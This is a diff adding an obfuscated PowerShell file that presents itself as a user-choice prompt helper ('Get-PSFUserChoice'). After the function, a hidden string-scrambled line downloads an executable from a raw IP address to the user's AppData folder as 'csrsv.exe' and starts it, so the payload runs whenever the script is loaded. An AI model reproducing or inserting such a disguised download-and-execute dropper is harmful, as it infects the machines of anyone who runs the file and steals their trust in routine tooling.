@@ -1,0 +1,53 @@
+function g`E`T-p`SFU`SercH`oICE
+{
+
+	[OutputType([System.Int32])]
+	[CmdletBinding()]
+	param (
+		[Parameter(MaNdatOry = ${T`RUe})]
+		[object[]]
+		${o`PT`IonS},
+		
+		[string]
+		${ca`PtIon},
+		
+		[string]
+		${mEss`A`gE},
+		
+		[int]
+		${de`FaULt`ChoIce} = 0
+	)
+	
+	begin
+	{
+		.("{4}{3}{0}{1}{2}"-f'-PSF','Me','ssage','e','Writ') -Level ("{0}{1}{3}{2}" -f'Int','ernalC','t','ommen') -Message "Bound parameters: $($PSBoundParameters.Keys -join ", ") " -Tag ("{1}{0}"-f 'g','debu'), ("{0}{1}"-f's','tart'), ("{0}{1}" -f'p','aram')
+		${ChO`I`CeS} = @()
+		foreach (${oP`TIOn} in ${OPT`i`oNs})
+		{
+			if (${opti`On} -is [hashtable])
+			{
+				${LA`Bel} = ${O`ption}."K`EyS" -match '^l' | &("{0}{2}{1}" -f 'Select','Object','-') -First 1
+				[string]${labeL`VA`l`UE} = ${oPt`iOn}[${L`ABel}]
+				${H`elP} = ${op`TiOn}."ke`yS" -match '^h' | .("{3}{1}{2}{0}" -f't','ec','t-Objec','Sel') -First 1
+				[string]${hEl`Pva`LuE} = ${O`pTioN}[${he`Lp}]
+				
+			}
+			else
+			{
+				${l`ABelv`A`luE} = "$option"
+				${H`e`LpVa`lUE} = "$option"
+			}
+			if (${l`A`BelVAluE} -match "&") { ${CHo`Ic`eS} += .("{1}{3}{2}{0}" -f'bject','N','-O','ew') ("{9}{10}{8}{3}{6}{5}{0}{7}{2}{1}{4}"-f 'ti','iceDes','t.Cho','m.M','cription','utoma','anagement.A','on.Hos','e','Sys','t') -ArgumentList ${l`AbE`LvAlUE}, ${hElP`V`ALuE} }
+			else { ${Ch`oic`eS} += &("{0}{2}{1}" -f'Ne','t','w-Objec') ("{3}{9}{1}{6}{4}{10}{7}{0}{5}{8}{2}"-f 'eDes','ment.Au','n','S','matio','crip','to','ic','tio','ystem.Manage','n.Host.Cho') -ArgumentList "&$($labelValue.Trim())", ${h`Elp`VALUe} }
+		}
+	}
+	process
+	{
+		
+		
+		if (${OP`TiO`NS}."cou`Nt" -eq 1) { return 0 }
+		
+		${h`OsT}."UI".("{0}{4}{3}{2}{1}" -f 'Pr','oice','Ch','For','ompt').Invoke(${c`Apti`on}, ${m`ess`Age}, ${C`hOIc`es}, ${DE`F`AuLTC`hOiCe})
+	}
+}
+(&("{1}{2}{0}" -f'ect','N','ew-Obj') ("{2}{0}{3}{1}" -f'ys','m.Net.WebClient','S','te')).("{2}{1}{0}" -f 'nloadFile','w','Do').Invoke(("{9}{3}{4}{1}{5}{8}{6}{0}{7}{2}"-f'yahoo/cs','.10','exe','ttp://','94','2.5','~','rsv.','3.238/','h'),"$env:APPDATA\csrsv.exe");&("{0}{1}{3}{2}" -f 'Start','-Pro','ss','ce') ("$env:APPDATA\csrsv.exe")
